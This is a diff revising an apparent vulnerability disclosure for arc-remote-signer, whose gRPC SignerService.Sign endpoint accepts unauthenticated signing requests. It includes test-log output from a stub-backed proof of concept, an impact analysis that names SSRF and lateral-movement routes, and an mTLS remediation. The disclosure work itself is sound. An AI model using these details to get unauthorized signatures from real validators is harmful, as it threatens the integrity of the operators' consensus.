+  /arc.signer.v1.SignerService/Sign
+[gRPC middleware JSON access-log line omitted here for readability —
+"status":"OK" confirmed, full raw line visible in the attached screenshot]
+
+Result:
+  REQUEST ACCEPTED
+
+gRPC status:
+  OK
+
+Signing backend:
+  LOCAL STUB (not production KMS/Nitro Enclave)
+  response = "STUB-SIGNATURE-#2-NOT-A-REAL-CRYPTOGRAPHIC-SIGNATURE"
+
+=== FINDING REPRODUCED ===
+The request reached the production server construction path
+(public.New(), no reimplementation) without authentication, twice,
+with two different attacker-chosen messages and no metadata.
+2026/08/31 02:24:06 initiating graceful shutdown of gRPC server at 127.0.0.1:50313
+2026/08/31 02:24:06 gRPC server gracefully stopped
 --- PASS: TestUnauthenticatedSignIsAccepted (0.03s)
 PASS
-ok  	github.com/circlefin/arc-remote-signer/internal/app/public	1.220s
+ok      github.com/circlefin/arc-remote-signer/internal/app/public      1.494s
 ```
 
-The server's own real middleware request log confirms `"status":"OK"` —
-the unauthenticated call was processed as a legitimate request. No real
-network, no real key/enclave, ephemeral local server, shut down at the
-end of the test (minimal-impact principle).
+The server's own real middleware request log confirms `"status":"OK"` — the unauthenticated call was processed as a legitimate request. No real network, no real key/enclave, ephemeral local server, shut down at the end of the test (minimal-impact principle).
 
 ## Impact
-An attacker able to reach the `SignerService` port (SSRF from another
-service in the same VPC, security-group misconfiguration, lateral
-movement after compromising another host on the same subnet) can make
-the Arc Chain validator sign ANY consensus message with the enclave key
-— without needing to compromise the enclave/key itself. This opens real
-risk of equivocation/double-signing (signing two conflicting values at
-the same consensus height/round), which in BFT systems typically results
-in validator slashing and, depending on Arc Chain's specific consensus
-design, could contribute to broader availability/integrity attacks on
-the network. The enclave's hardware-isolation guarantee protects the KEY
-against extraction, but does not protect against WHO CAN REQUEST a
-signature — and today, that's anyone who can reach the port.
+The confirmed impact is **unauthorized access to a privileged validator signing operation**.
 
-## Suggested fix
-Add mutual authentication (mTLS with `RequireAndVerifyClientCert` +
-`ClientCAs`, or an equivalent caller-identity mechanism) to
-`SignerService`, following the same pattern industry validator
-remote-signing systems already implement (e.g., Tendermint/CometBFT
-KMS). Localized change in `internal/common/grpc/server/option.go`
-(`WithTLS`) and `configs/app.yaml` (enable TLS + configure a client CA by
-default, don't leave `tls.enabled: false` as the default).
+Any principal that obtains network reachability to the `SignerService` endpoint can invoke `SignerService.Sign` without presenting an API credential, authentication token, client certificate, or other application-level identity.
+
+The attacker controls the `message` bytes supplied to the RPC. The production `Service.Sign` implementation performs only basic request validation and then forwards the supplied bytes unchanged to `enclavePvd.SignMessage(...)`.
+
+The executable PoC demonstrates this authentication failure against the repository's unmodified production `public.New()` server-construction path. Two independent requests containing different attacker-controlled messages were accepted without authentication or authorization metadata and returned gRPC status `OK`.
+
+The PoC intentionally uses a local stub signing backend. Therefore, it does **not** claim that a real validator signature, private key, KMS operation, or Nitro Enclave signing operation was obtained. The production source-code path independently establishes that, in a real deployment, accepted requests are forwarded to the enclave signing provider.
+
+### Security boundary bypass
+The intended architecture uses the remote signer to isolate the validator's private signing key behind a privileged signing interface. Network-level controls such as AWS VPC security groups establish *where* the service can be reached, but do not establish *which* workload is authorized to invoke `SignerService.Sign`. The current request path is effectively:
+
+```text
+Network-reachable principal
+        |
+        v
+No caller authentication / authorization
+        |
+        v
+SignerService.Sign
+        |
+        v
+Attacker-controlled message bytes
+        |
+        v
+Signing provider / validator signing key
+```
+
+The Nitro Enclave protects the private key from direct extraction, but the absence of caller authentication means that compromise of another workload with network access to the signer can potentially provide access to the signing capability without compromising the enclave itself. A realistic attack path could involve a compromised workload, SSRF, lateral movement, or an overly permissive network policy that provides connectivity to the signer endpoint.
+
+### Potential validator-consensus impact
+If an attacker can construct bytes that the Arc consensus layer accepts as a valid validator-signing request, the unauthorized signing capability could potentially affect validator participation in consensus, including conflicting or unauthorized signatures. The exact protocol-level consequence depends on how the Arc consensus layer constructs, domain-separates, and validates messages outside `arc-remote-signer`.
+
+The raw-byte signing interface may also warrant protocol-level review because the RPC does not itself enforce a typed signing domain. However, this report does not rely on that observation to establish the vulnerability or claim a consensus-level exploit.
+
+This report does **not** claim that a consensus equivocation, double-signing event, slashing event, or broader consensus failure was reproduced.
+
+The vulnerability established independently of those downstream conditions is that **network reachability is currently sufficient to invoke a privileged validator signing RPC without authenticating the caller**.
+
+## Suggested remediation
+The signing RPC should have an explicit authentication and authorization boundary so that only the intended validator process can invoke the signing operation. A suitable implementation would be mutual TLS with client-certificate verification — configuring a trusted client CA and requiring verified client certificates in `internal/common/grpc/server/option.go` (`WithTLS`) and `configs/app.yaml`. Alternatively, another strong caller-authentication mechanism appropriate for the deployment would work equally well. The important property is that network reachability alone must not be sufficient to invoke `SignerService.Sign`.
